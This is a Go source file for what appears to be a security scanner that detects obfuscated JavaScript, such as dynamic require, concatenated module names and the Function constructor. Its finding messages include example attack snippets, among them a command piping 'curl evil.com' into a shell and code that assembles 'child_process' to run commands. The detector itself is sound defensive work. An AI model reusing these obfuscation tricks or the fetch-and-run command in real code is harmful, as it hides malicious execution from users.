package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// ASTAnalyzer performs AST-like deep analysis of JavaScript code to detect
// obfuscation patterns that regex-only scanning misses. While not a full AST
// parser, it uses multi-pattern heuristics to detect:
// - Dynamic require/import with computed strings
// - String concatenation to build sensitive module names
// - Computed property access on dangerous modules
// - Function constructor abuse
// - Proxy-based require wrapping
type ASTAnalyzer struct{}

func NewASTAnalyzer() *ASTAnalyzer {
	return &ASTAnalyzer{}
}

func (a *ASTAnalyzer) Name() string {
	return "ast-analysis"
}

// Patterns for dynamic code construction.
var (
	// Dynamic require: require(variable) or require(expr)
	dynamicRequirePattern = regexp.MustCompile(`require\s*\(\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*\)`)

	// Computed property on require result: require('x')[variable]
	computedPropPattern = regexp.MustCompile(`\]\s*\(\s*['"]|require\s*\([^)]+\)\s*\[`)

	// String concatenation with + to build names (3+ pieces)
	stringConcatPattern = regexp.MustCompile(`['"][a-zA-Z_]{1,5}['"]\s*\+\s*['"][a-zA-Z_]{1,5}['"]\s*\+\s*['"][a-zA-Z_]{1,5}['"]`)

	// Array literal with string elements followed by join
	arrayLiteralPattern = regexp.MustCompile(`\[\s*['"][^'"]+['"]\s*(?:,\s*['"][^'"]+['"]\s*)+\]`)
	// .join() call
	joinCallPattern = regexp.MustCompile(`\.join\s*\(\s*['"]`)

	// globalThis / global / window - direct access or variable alias
	globalAssignPattern = regexp.MustCompile(`=\s*(?:globalThis|global|window)\s*(?:[;|&\n]|\|\||&&)`)
	globalDirectPattern = regexp.MustCompile(`(?:globalThis|global|window)\s*\[`)

	// new Proxy(require, ...) or Proxy(require, ...)
	proxyRequirePattern = regexp.MustCompile(`(?:new\s+)?Proxy\s*\(\s*require`)

	// new Function('...')
	functionConstructorPattern = regexp.MustCompile(`new\s+Function\s*\(`)

	// String.fromCharCode with multiple args
	fromCharCodePattern = regexp.MustCompile(`String\s*\.\s*fromCharCode\s*\(\s*\d+\s*(?:,\s*\d+\s*){2,}`)

	// Computed property access pattern: obj['ev' + 'al']
	computedMethodCallPattern = regexp.MustCompile(`\[\s*['"][a-zA-Z]{1,5}['"]\s*\+\s*['"][a-zA-Z]{1,5}['"]\s*\]`)
)

func (a *ASTAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	// Helper to create a finding with location
	addFinding := func(pattern *regexp.Regexp, title, desc string, sev Severity, exploit, remediation string) {
		matches := pattern.FindAllStringIndex(content, -1)
		for _, m := range matches {
			line, col := GetLineCol(content, m[0])
			extract := GetCodeExtract(content, m[0], m[1], 2)
			findings = append(findings, Finding{
				Analyzer:       a.Name(),
				Title:          title,
				Description:    desc,
				Severity:       sev,
				ExploitExample: exploit,
				Remediation:    remediation,
				File:           filename,
				Line:           line,
				Column:         col,
				CodeExtract:    extract,
			})
		}
	}

	// Dynamic require detection
	if dynamicRequirePattern.MatchString(content) {
		if hasStringBuilding(content) {
			addFinding(dynamicRequirePattern, "Dynamic require with computed module name",
				fmt.Sprintf("File %q uses require() with a variable argument, combined with string construction.", filename),
				SeverityHigh,
				"Dynamic require hides malicious module loading from scanners:\n    const name = 'child' + '_process';\n    const cp = require(name);\n    cp.exec('curl evil.com | sh');",
				"Investigate what module is being dynamically required.")
		}
	}

	// String concatenation obfuscation
	if stringConcatPattern.MatchString(content) {
		addFinding(stringConcatPattern, "String concatenation obfuscation detected",
			fmt.Sprintf("File %q builds strings by concatenating multiple small pieces.", filename),
			SeverityHigh,
			"String concatenation hides dangerous identifiers:\n    const a = 'ch' + 'il' + 'd_' + 'pr' + 'oc' + 'es' + 's';\n    require(a).execSync('malicious command');",
			"Manually reconstruct the concatenated strings.")
	}

	// Array join obfuscation
	if arrayLiteralPattern.MatchString(content) && joinCallPattern.MatchString(content) {
		addFinding(joinCallPattern, "Array join obfuscation detected",
			fmt.Sprintf("File %q uses array.join() to construct strings.", filename),
			SeverityHigh,
			"Array join bypasses static analysis:\n    const parts = ['child', '_', 'process'];\n    require(parts.join('')).exec('whoami');",
			"Evaluate the array contents and join result.")
	}

	// Computed property access
	if computedPropPattern.MatchString(content) || computedMethodCallPattern.MatchString(content) {
		pattern := computedPropPattern
		if computedMethodCallPattern.MatchString(content) {
			pattern = computedMethodCallPattern
		}
		addFinding(pattern, "Computed property access on module",
			fmt.Sprintf("File %q uses bracket notation to access module methods.", filename),
			SeverityMedium,
			"Computed properties hide dangerous method calls:\n    const fn = 'ex' + 'ec';\n    require('child_process')[fn]('whoami');",
			"Determine what property is being accessed.")
	}

	// Global scope computed access
	if globalDirectPattern.MatchString(content) || globalAssignPattern.MatchString(content) {
		pattern := globalDirectPattern
		if globalAssignPattern.MatchString(content) {
			pattern = globalAssignPattern
		}
		addFinding(pattern, "Global scope computed access",
			fmt.Sprintf("File %q accesses global scope with computed property names.", filename),
			SeverityHigh,
			"Global computed access hides eval calls:\n    const g = globalThis;\n    g['ev' + 'al'](malicious_code);",
			"Investigate what global function is being called.")
	}

	// Proxy-based require wrapping
	if proxyRequirePattern.MatchString(content) {
		addFinding(proxyRequirePattern, "Proxy-wrapped require detected",
			fmt.Sprintf("File %q wraps require() in a Proxy.", filename),
			SeverityHigh,
			"Proxy wrapping hides what modules are actually loaded:\n    const p = new Proxy(require, { apply: (t, c, a) => t(a[0]) });",
			"Examine the Proxy handler.")
	}

	// Function constructor
	if functionConstructorPattern.MatchString(content) {
		addFinding(functionConstructorPattern, "Function constructor used",
			fmt.Sprintf("File %q uses new Function() which is equivalent to eval().", filename),
			SeverityCritical,
			"Function constructor is eval() in disguise:\n    const fn = new Function('return process.env');",
			"Investigate the constructed function body.")
	}

	// String.fromCharCode obfuscation
	if fromCharCodePattern.MatchString(content) {
		addFinding(fromCharCodePattern, "String.fromCharCode obfuscation",
			fmt.Sprintf("File %q uses String.fromCharCode() to build strings.", filename),
			SeverityHigh,
			"Character code building hides string content:\n    String.fromCharCode(101, 118, 97, 108) // 'eval'",
			"Decode the character codes.")
	}

	return findings
}

// hasStringBuilding checks if code contains evidence of string construction
// near require calls.
func hasStringBuilding(content string) bool {
	indicators := []string{
		"+ '", "+ \"",
		"' +", "\" +",
		".join(",
		"fromCharCode",
		"String(",
		"Buffer.from(",
		"atob(",
	}
	for _, ind := range indicators {
		if strings.Contains(content, ind) {
			return true
		}
	}
	return false
}
